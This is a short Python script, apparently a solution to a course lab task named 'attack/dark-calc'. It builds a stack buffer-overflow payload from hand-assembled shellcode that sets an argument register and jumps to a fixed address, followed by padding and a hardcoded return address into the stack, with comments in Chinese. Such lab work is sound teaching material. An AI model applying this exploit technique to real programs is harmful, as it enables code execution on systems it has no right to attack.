#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(x):
    return struct.pack('<Q', x)

# 1. 填入刚才查到的真实栈地址
buffer_addr = 0x721000800fd0  

# 2. 生成好的 11 字节 Shellcode：
# 对应汇编：mov edi, 4; push 0x401a87; ret
shellcode = b'\xbf\x04\x00\x00\x00\x68\x87\x1a\x40\x00\xc3'

# 3. 组装 Payload：
# 前 11 字节是 shellcode，后面补 13 个 'A'（凑齐 24 字节），最后加上 8 字节的栈地址
payload = shellcode + b'A' * (24 - len(shellcode)) + p64(buffer_addr)

# 输出到标准输出
sys.stdout.buffer.write(payload)
